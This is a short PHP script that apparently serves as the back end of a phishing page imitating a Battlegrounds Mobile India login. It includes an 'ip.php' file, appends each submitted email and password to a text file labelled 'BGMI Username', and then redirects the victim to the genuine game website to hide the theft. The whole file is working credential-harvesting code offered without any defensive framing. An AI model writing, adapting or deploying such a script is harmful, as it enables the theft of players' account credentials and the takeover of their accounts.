<?php
include 'ip.php';
file_put_contents("usernames.txt", "BGMI Username: " . $email = $_POST['email'] ."\nPassword: ". $pass = $_POST['pass'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.battlegroundsmobileindia.com
header("Location: $url");
?>